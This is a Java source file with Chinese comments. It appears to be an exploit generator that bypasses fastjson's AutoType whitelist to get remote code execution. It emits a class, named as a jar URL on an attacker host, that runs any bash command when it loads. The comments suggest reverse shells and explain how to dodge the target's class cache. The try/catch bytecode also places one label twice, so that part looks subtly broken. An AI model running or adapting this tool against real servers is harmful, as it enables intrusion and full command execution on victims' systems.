import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.AnnotationVisitor;
import org.objectweb.asm.Label;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;

import static org.objectweb.asm.Opcodes.*;

/**
 * 通用恶意类生成器（任意命令 + 可换类名）。
 *
 * 用法:
 *   java GenProbe2 <ipDecimal> <port> <outDir> [jarName] [entryName]
 *
 *   jarName   远程 jar 文件名（无扩展名），默认 probe
 *   entryName jar 内类条目名，默认 POC
 *
 * 每次换命令时，把 jarName/entryName 换成新的（如 probe2/POC2），
 * 内部类名就变成全新的 jar:http://IP:PORT/probe2!/POC2，
 * 从而绕过 JVM 的同名类缓存（无需重启目标服务）。
 *
 * 执行的命令按优先级从下面两处取：
 *   1) 同目录下 cmd.txt 的第一行（推荐，避开 Windows 命令行引号地狱）
 *   2) 没有 cmd.txt 时默认 touch /tmp/PWNED_CVE-2026-16723
 *
 * 关键：<clinit> 用的是 Runtime.exec(String[])，等价于
 *   Runtime.getRuntime().exec(new String[]{"bash", "-c", CMD});
 * 所以 CMD 里可以写管道、重定向、$()、反弹 shell 等任意 bash 语法。
 */
public class GenProbe2 {
    public static void main(String[] args) throws Exception {
        if (args.length < 3) {
            System.out.println("用法: java GenProbe2 <ipDecimal> <port> <outDir> [jarName] [entryName]");
            System.out.println("命令写在同目录 cmd.txt 第一行；不写则默认 touch marker");
            return;
        }
        String ip   = args[0];
        String port = args[1];
        String out  = args[2];
        String jarName   = args.length > 3 ? args[3] : "probe";
        String entryName = args.length > 4 ? args[4] : "POC";

        // 读命令：cmd.txt 优先，否则默认 marker
        String cmd = "touch /tmp/PWNED_CVE-2026-16723";
        Path cmdFile = Paths.get("cmd.txt");
        if (Files.exists(cmdFile)) {
            String first = Files.readAllLines(cmdFile, StandardCharsets.UTF_8)
                                .stream().map(String::trim)
                                .filter(s -> !s.isEmpty() && !s.startsWith("#"))
                                .findFirst().orElse(null);
            if (first != null) cmd = first;
        }
        System.out.println("[*] 将执行命令: " + cmd);
        System.out.println("[*] jarName=" + jarName + " entryName=" + entryName);

        // 内部类名必须精确等于 jar:http://IP:PORT/<jarName>!/<entryName>
        String internal = "jar:http://" + ip + ":" + port + "/" + jarName + "!/" + entryName;

        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);
        // 注意：ASM 内部类名一般用 '/'，这里我们故意写带 ':' '/' '!' 的 URL，ASM 不做校验
        cw.visit(V1_8, ACC_PUBLIC, internal, null, "java/lang/Object", null);

        // ---- 类级 @JSONType（关键）：
        // 让 fastjson 注解扫描阶段把它判定为 hasJsonType，从而绕过 AutoType 白名单 ----
        AnnotationVisitor av = cw.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true);
        AnnotationVisitor ar = av.visitArray("orders");
        for (String f : new String[]{"x"}) ar.visit(null, f);
        ar.visitEnd();
        av.visitEnd();

        // 默认构造方法（空壳，主要逻辑在 <clinit>）
        MethodVisitor ctor = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
        ctor.visitCode();
        ctor.visitVarInsn(ALOAD, 0);
        ctor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        ctor.visitInsn(RETURN);
        ctor.visitMaxs(0, 0);
        ctor.visitEnd();

        // ---- <clinit> 静态块：类被加载时执行命令 ----
        MethodVisitor cl = cw.visitMethod(ACC_STATIC, "<clinit>", "()V", null, null);
        cl.visitCode();
        Label start = new Label();
        Label end   = new Label();
        cl.visitTryCatchBlock(start, end, end, "java/lang/Exception");
        cl.visitLabel(start);

        // String[] cmds = new String[]{"bash", "-c", CMD};
        cl.visitInsn(ICONST_3);
        cl.visitTypeInsn(ANEWARRAY, "java/lang/String");

        cl.visitInsn(DUP);
        cl.visitInsn(ICONST_0);
        cl.visitLdcInsn("bash");
        cl.visitInsn(AASTORE);

        cl.visitInsn(DUP);
        cl.visitInsn(ICONST_1);
        cl.visitLdcInsn("-c");
        cl.visitInsn(AASTORE);

        cl.visitInsn(DUP);
        cl.visitInsn(ICONST_2);
        cl.visitLdcInsn(cmd);
        cl.visitInsn(AASTORE);

        cl.visitVarInsn(ASTORE, 1);                 // 数组存到局部变量 1（<clinit> 是 static，slot 0 留给 catch 异常）

        // Runtime.getRuntime().exec(cmds);
        cl.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime",
                           "()Ljava/lang/Runtime;", false);
        cl.visitVarInsn(ALOAD, 1);
        cl.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                           "([Ljava/lang/String;)Ljava/lang/Process;", false);
        cl.visitInsn(POP);

        cl.visitLabel(end);
        cl.visitInsn(RETURN);
        cl.visitLabel(end);
        cl.visitVarInsn(ASTORE, 0);                // catch (Exception e) { }
        cl.visitInsn(RETURN);

        cl.visitMaxs(0, 0);
        cl.visitEnd();

        cw.visitEnd();
        byte[] data = cw.toByteArray();
        Files.createDirectories(Paths.get(out));
        Path outFile = Paths.get(out, "POC.class");
        Files.write(outFile, data);
        System.out.println("[+] 写出 " + outFile.toAbsolutePath() + " (" + data.length + " bytes)");
        System.out.println("[+] 内部类名 = " + internal);
    }
}
